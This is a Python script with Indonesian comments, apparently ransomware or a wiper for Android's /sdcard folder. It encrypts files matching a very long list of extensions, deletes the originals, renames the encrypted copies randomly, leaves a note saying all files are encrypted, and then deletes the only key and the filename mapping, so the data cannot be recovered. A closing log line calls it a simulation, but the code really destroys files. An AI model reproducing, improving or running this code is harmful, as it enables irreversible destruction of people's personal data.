#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import json
import random
import string
import logging
import shutil
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor, as_completed

# KONFIGURASI
TARGET_DIR = "/sdcard"
EXTENSIONS = ['.txt', '.doc', '.docx', '.odt', '.rtf', '.tex', '.wpd', '.wps', '.pages', '.abw', '.csv', '.tsv', '.md', '.markdown', '.rst', '.log', '.tex', '.nfo', '.readme', '.xls', '.xlsx', '.xlsm', '.xlsb', '.ods', '.numbers', '.xlr', '.xltx', '.xltm', '.ppt', '.pptx', '.pptm', '.pps', '.ppsx', '.odp', '.key', '.gslides', '.potx', '.pdf', '.epub', '.mobi', '.azw', '.azw3', '.djvu', '.fb2', '.lit', '.cbr', '.cbz', '.prc', '.pdb', '.chm', '.pml', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.webp', '.heic', '.heif', '.ico', '.svg', '.eps', '.psd', '.ai', '.raw', '.cr2', '.nef', '.arw', '.dng', '.orf', '.rw2', '.pef', '.srw', '.xcf', '.cdr', '.dcm', '.dicom', '.icns', '.jng', '.jp2', '.jps', '.jxr', '.pbm', '.pgm', '.ppm', '.pnm', '.psb', '.ras', '.sun', '.tga', '.xbm', '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus', '.aiff', '.ape', '.ac3', '.mid', '.midi', '.amr', '.au', '.pcm', '.dts', '.ra', '.rm', '.caf', '.voc', '.wv', '.spx', '.tta', '.dsd', '.dsf', '.dff', '.snd', '.8svx', '.s3m', '.xm', '.it', '.mod', '.mtm', '.umx', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.mpeg', '.mpg', '.m4v', '.3gp', '.3g2', '.ogv', '.ts', '.mts', '.m2ts', '.vob', '.rm', '.rmvb', '.asf', '.divx', '.xvid', '.qt', '.yuv', '.dv', '.mxf', '.swf', '.f4v', '.h264', '.hevc', '.vp8', '.vp9', '.av1', '.m2v', '.mpv2' '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.tgz', '.tbz2', '.z', '.lz', '.lzma', '.lzo', '.zst', '.arj', '.cab', '.ace', '.rpm', '.deb', '.pkg', '.dmg', '.iso', '.img', '.uue', '.hqx', '.sit', '.sitx', '.dms', '.war', '.ear', '.sar', '.apk', '.ipa', '.snap', '.flatpak', '.exe', '.msi', '.apk', '.app', '.deb', '.rpm', '.dmg', '.bin', '.sh', '.bat', '.cmd', '.ps1', '.jar', '.wsf', '.com', '.scr', '.csh', '.ksh', '.bash', '.zsh', '.elf', '.out', '.run', '.bin', '.dmg', '.pkg', '.appimage', '.msp', '.msu', '.py', '.pyc', '.pyo', '.js', '.jsx', '.ts', '.tsx', '.html', '.htm', '.css', '.scss', '.sass', '.less', '.php', '.phtml', '.php3', '.php4', '.php5', '.phps', '.java', '.class', '.jar', '.c', '.cpp', '.cc', '.cxx', '.h', '.hpp', '.hxx', '.cs', '.vb', '.rb', '.rbw', '.pl', '.pm', '.t', '.pod', '.go', '.rs', '.swift', '.kt', '.kts', '.scala', '.sc', '.m', '.mm', '.lua', '.r', '.R', '.dart', '.elm', '.hs', '.lhs', '.erl', '.hrl', '.ex', '.exs', '.clj', '.cljs', '.cljc', '.edn', '.groovy', '.gvy', '.gradle', '.sql', '.psql', '.cypher', '.graphql', '.gql', '.json', '.yaml', '.yml', '.toml', '.ini', '.cfg', '.conf', '.proto', '.capnp', '.idl', '.frag', '.vert', '.glsl', '.hlsl', '.metal', '.fs', '.vs', '.asm', '.s', '.inc', '.awk', '.sed', '.jsp', '.asp', '.aspx', '.asax', '.ashx', '.asmx', '.axd', '.vbhtml', '.cshtml', '.razor', '.ejs', '.hbs', '.handlebars', '.mustache', '.pug', '.jade', '.haml', '.slim', '.sls', '.cfm', '.cfc', '.lucee', '.nix', '.dhall', '.cabal', '.el', '.elc', '.scm', '.ss', '.rkt', '.rktl', '.chez', '.sch', '.v', '.vhd', '.vhdl', '.verilog', '.sv', '.svh', '.tcl', '.tk', '.exp', '.itcl', '.icl', '.pyx', '.pxd', '.pxi', '.pyd', '.rpy', '.pyw', '.gyp', '.gypi', '.cmake', '.mk', '.d', '.mak', '.am', '.aclocal', '.m4', '.vala', '.vapi', '.deps', '.pc', '.html', '.htm', '.xhtml', '.css', '.scss', '.sass', '.less', '.stylus', '.styl', '.js', '.jsx', '.ts', '.tsx', '.json', '.jsonld', '.geojson', '.xml', '.rss', '.atom', '.xsl', '.xslt', '.svg', '.woff', '.woff2', '.ttf', '.eot', '.otf', '.ico', '.htaccess', '.htpasswd', '.htgroups', '.htdigest', '.php', '.phtml', '.php3', '.php4', '.php5', '.phps', '.asp', '.aspx', '.jsp', '.jspx', '.cfm', '.cfc', '.do', '.action', '.pl', '.cgi', '.fcgi', '.wsgi', '.py', '.rb', '.rhtml', '.erb', '.shtml', '.shtm', '.dhtml', '.pwa', '.webmanifest', '.manifest', '.appcache', '.csv', '.tsv', '.psv', '.json', '.jsonl', '.ndjson', '.xml', '.yaml', '.yml', '.toml', '.ini', '.cfg', '.conf', '.properties', '.plist', '.proto', '.capnp', '.sql', '.sqlite', '.sqlite3', '.db', '.db3', '.mdb', '.accdb', '.mdf', '.ldf', '.ndf', '.frm', '.ibd', '.myd', '.myi', '.dbf', '.dbase', '.pdb', '.edb', '.kdbx', '.kdb', '.keychain', '.dbs', '.nsf', '.ntf', '.fp7', '.fmp12', '.maria', '.mongodb', '.bson', '.avro', '.parquet', '.orc', '.feather', '.h5', '.hdf5', '.nc', '.cdf', '.grib', '.grib2', '.bufr', '.dbx', '.dbk', '.ini', '.cfg', '.conf', '.config', '.properties', '.plist', '.reg', '.dll', '.so', '.dylib', '.sys', '.drv', '.vxd', '.ocx', '.cpl', '.msc', '.inf', '.log', '.tmp', '.temp', '.bak', '.backup', '.sav', '.old', '.orig', '.patch', '.diff', '.lock', '.pid', '.socket', '.service', '.timer', '.mount', '.automount', '.swap', '.target', '.path', '.scope', '.slice', '.desktop', '.directory', '.policy', '.rules', '.modprobe', '.conf.d', '.ini.d', '.ttf', '.otf', '.woff', '.woff2', '.eot', '.svg', '.fon', '.pfm', '.pfb', '.sfd', '.bdf', '.pcf', '.psf', '.ttc', '.dfont', '.fnt', '.fon', '.otb', '.cef', '.dwg', '.dxf', '.dwf', '.dgn', '.stl', '.obj', '.mtl', '.3ds', '.max', '.blend', '.blend1', '.blend2', '.c4d', '.ma', '.mb', '.lwo', '.lxo', '.lws', '.lwob', '.ply', '.x3d', '.x3dv', '.x3db', '.step', '.stp', '.iges', '.igs', '.jt', '.sat', '.sab', '.brep', '.sldprt', '.sldasm', '.slddrw', '.ipt', '.iam', '.idw', '.prt', '.asm', '.neu', '.par', '.psm', '.pwd', '.slddft', '.x_b', '.x_t', '.xmt', '.xmt_txt', '.model', '.catpart', '.catproduct', '.cgr', '.3dxml', '.edrw', '.eprt', '.easm', '.drwdot', '.prtdot', '.asmdot', '.dlv', '.dmt', '.dm', '.dwfx', '.dwt', '.dxb', '.shp', '.shx', '.dbf', '.prj', '.qix', '.qpj', '.cpg', '.sbn', '.sbx', '.fbn', '.fbx', '.ain', '.aih', '.ixs', '.mxs', '.atx', '.shp.xml', '.shp.zip', '.geojson', '.kml', '.kmz', '.gpx', '.gml', '.tif', '.tiff', '.tfw', '.tifw', '.jp2', '.j2w', '.sid', '.sdw', '.ecw', '.ers', '.img', '.rrd', '.vrt', '.dem', '.hgt', '.bgl', '.dt0', '.dt1', '.dt2', '.map', '.tab', '.dat', '.id', '.ind', '.map', '.mif', '.mid', '.wor', '.dwg', '.dxf', '.osm', '.pbf', '.mbtiles', '.vmdk', '.vhd', '.vhdx', '.vdi', '.vbox', '.ova', '.ovf', '.vmx', '.vmxf', '.vmsn', '.vmsd', '.nvram', '.vmss', '.vmem', '.vswp', '.vmwarevm', '.qcow', '.qcow2', '.qed', '.cow', '.hdd', '.hds', '.hdd', '.dsk', '.img', '.raw', '.bin', '.iso', '.img', '.bin', '.cue', '.nrg', '.mdf', '.mds', '.dmg', '.ccd', '.sub', '.b5t', '.b6t', '.bwt', '.cdi', '.c2d', '.gi', '.pdi', '.daa', '.uif', '.hfs', '.hfs+', '.apfs', '.ntfs', '.fat', '.exfat', '.ext2', '.ext3', '.ext4', '.btrfs', '.xfs', '.zfs', '.vfat', '.squashfs', '.romfs', '.cramfs', '.ubifs', '.jffs2', '.yaffs2', '.bak', '.backup', '.bkp', '.old', '.orig', '.sav', '.tmp', '.wbk', '.abk', '.vib', '.vbk', '.vbm', '.vbk', '.bkf', '.bk', '.bup', '.spv', '.spf', '.spb', '.spi', '.tib', '.tibx', '.win', '.gho', '.ghs', '.v2i', '.pqi', '.sd', '.sdd', '.snp', '.sna', '.sv2i', '.pmf', '.cmb', '.tfsm', '.bcd', '.regback', '.eml', '.msg', '.pst', '.ost', '.mbx', '.mail', '.mbox', '.emlx', '.vcf', '.vcard', '.ics', '.icalendar', '.vcs', '.msf', '.dbx', '.idx', '.dat', '.eml', '.emlxp', '.emlxpart', '.olk14', '.olk14msg', '.olk14msgs', '.olk14signature', '.olk14task', '.torrent', '.crdownload', '.part', '.lnk', '.url', '.webloc', '.desktop', '.directory', '.theme', '.icns', '.cur', '.ani', '.cpi', '.dmp', '.mdmp', '.hdmp', '.core', '.stackdump', '.trc', '.etl', '.evtx', '.evt', '.etl', '.blg', '.ps1xml', '.psc1', '.psd1', '.psm1', '.pssc', '.cdxml', '.xaml', '.resx', '.rc', '.resources', '.pri', '.nuspec', '.nupkg', '.snupkg', '.vsix', '.vsp', '.vsps', '.vstemplate', '.vsz', '.vdproj', '.wixlib', '.wixobj', '.wxs', '.wixmsp', '.wixmst', '.wixpdb', '.msm', '.msp', '.msu', '.cab', '.cat', '.psf', '.ppkg', '.appx', '.appxbundle', '.msix', '.msixbundle', '.cer', '.pfx', '.p12', '.p7b', '.p7c', '.spc', '.sst', '.crl', '.csr', '.key', '.crt', '.der', '.pem', '.pub', '.asc', '.gpg', '.sig', '.sha', '.sha1', '.sha256', '.sha512', '.md5', '.sfv', '.par2', '.par', '.vol', '.rev', '.m3u', '.m3u8', '.pls', '.xspf', '.asx', '.wpl', '.zpl', '.cue', '.srt', '.sub', '.idx', '.ssa', '.ass', '.vtt', '.ttml', '.dfxp', '.smi', '.lrc', '.ly', '.abc', '.mid', '.kar', '.rmi', '.cmf', '.mod', '.s3m', '.xm', '.it', '.mtm', '.umx', '.stm', '.med', '.oct', '.mdx', '.mdr', '.mpt', '.mpd', '.mpx', '.mxl', '.musicxml', '.mscz', '.mscx', '.cap', '.capx', '.bww', '.ptb', '.ptb', '.gp3', '.gp4', '.gp5', '.gpx', '.gp', '.tef', '.tab', '.txt', '.nt', '.doc', '.docx', '.odt', '.rtf', '.wpd', '.wps', '.pages', '.abw', '.csv', '.tsv', '.psv', '.dif', '.slk', '.prn', '.wk1', '.wk2', '.wk3', '.wk4', '.wks', '.123', '.wb1', '.wb2', '.wb3', '.qpw', '.wq1', '.wq2']

NOTE_MESSAGE = "Hai, semua file Anda telah dienkripsi, Kemungkinan tidak dapat di kembalikan lagi seperti semula. Gok Gok Gok Gok Gok Gok Gok"
KEY_FILE = ".key"
MAP_FILE = ".map.json"
THREADS = 5

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def random_filename(extension, length=25):
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return name + extension

def generate_key():
    return Fernet.generate_key()

def save_key(key, key_path):
    with open(key_path, 'wb') as f:
        f.write(key)
    logging.info(f"Kunci disimpan di {key_path}")

def encrypt_file(filepath, cipher, mapping):
    try:
        # Baca isi file
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Enkripsi data
        encrypted_data = cipher.encrypt(data)
        
        # Tentukan nama baru acak
        dir_name = os.path.dirname(filepath)
        ext = os.path.splitext(filepath)[1]
        new_name = random_filename(ext)
        new_path = os.path.join(dir_name, new_name)
        
        # Tulis data terenkripsi
        with open(new_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Hapus file asli
        os.remove(filepath)
        
        # Simpan mapping
        mapping[new_path] = filepath
        
        logging.info(f"Enkripsi: {filepath} -> {new_path}")
        return True
    except Exception as e:
        logging.error(f"Gagal enkripsi {filepath}: {e}")
        return False

def find_files(target_dir, extensions):
    files = []
    for root, dirs, filenames in os.walk(target_dir):
        for f in filenames:
            # Lewati file kunci dan mapping (jika ada)
            if f == KEY_FILE or f == MAP_FILE:
                continue
            if any(f.lower().endswith(ext.lower()) for ext in extensions):
                files.append(os.path.join(root, f))
    return files

def save_mapping(mapping, map_path):
    with open(map_path, 'w') as f:
        json.dump(mapping, f, indent=2)
    logging.info(f"Mapping disimpan di {map_path}")

def leave_note(target_dir, device_id):
    note_path = os.path.join(target_dir, "Pesan.txt")
    note_content = f"""
Hai, semua file Anda telah dienkripsi.
"""
    with open(note_path, 'w') as f:
        f.write(note_content)
    logging.info(f"Catatan ditinggalkan di {note_path}")

def delete_key_and_map(target_dir):
    key_path = os.path.join(target_dir, KEY_FILE)
    map_path = os.path.join(target_dir, MAP_FILE)
    
    deleted = True
    if os.path.exists(key_path):
        os.remove(key_path)
        logging.info(f"File kunci {key_path} dihapus.")
        deleted = True
    if os.path.exists(map_path):
        os.remove(map_path)
        logging.info(f"File mapping {map_path} dihapus.")
        deleted = True
    
    if not deleted:
        logging.warning("Tidak ada file kunci/mapping yang ditemukan untuk dihapus.")
    
    return deleted

def main():
    # Cek apakah direktori target ada
    if not os.path.isdir(TARGET_DIR):
        logging.error(f"Direktori target {TARGET_DIR} tidak ditemukan.")
        sys.exit(1)

    # Cek apakah sudah ada file kunci (mencegah enkripsi ulang)
    key_path = os.path.join(TARGET_DIR, KEY_FILE)
    if os.path.exists(key_path):
        logging.warning(f"File kunci sudah ada di {key_path}. Kemungkinan sudah pernah dienkripsi. Hentikan untuk keamanan.")
        sys.exit(1)

    # Generate kunci
    key = generate_key()
    save_key(key, key_path)

    # Inisialisasi cipher
    cipher = Fernet(key)

    # Cari file
    logging.info(f"Mencari file dengan ekstensi {EXTENSIONS} di {TARGET_DIR}...")
    files = find_files(TARGET_DIR, EXTENSIONS)
    logging.info(f"Ditemukan {len(files)} file.")

    if not files:
        logging.info("Tidak ada file untuk dienkripsi.")
        # Tetap hapus kunci jika sudah dibuat (agar bersih)
        if os.path.exists(key_path):
            os.remove(key_path)
        return

    # Mapping untuk pemulihan
    mapping = {}

    # Enkripsi dengan thread pool
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(encrypt_file, f, cipher, mapping): f for f in files}
        for future in as_completed(futures):
            future.result()  # Raise exception jika ada

    # Simpan mapping (sementara)
    map_path = os.path.join(TARGET_DIR, MAP_FILE)
    save_mapping(mapping, map_path)

    # Ambil device ID (untuk Android)
    device_id = os.popen('getprop ro.serialno').read().strip() or "UNKNOWN"
    leave_note(TARGET_DIR, device_id)

    # HAPUS KUNCI DAN MAPPING SETELAH SELESAI (TANPA KONFIRMASI)
    delete_key_and_map(TARGET_DIR)

    logging.info("Enkripsi selesai. File kunci dan mapping telah dihapus. Data Anda tidak dapat dipulihkan (simulasi).")

if __name__ == "__main__":
    main()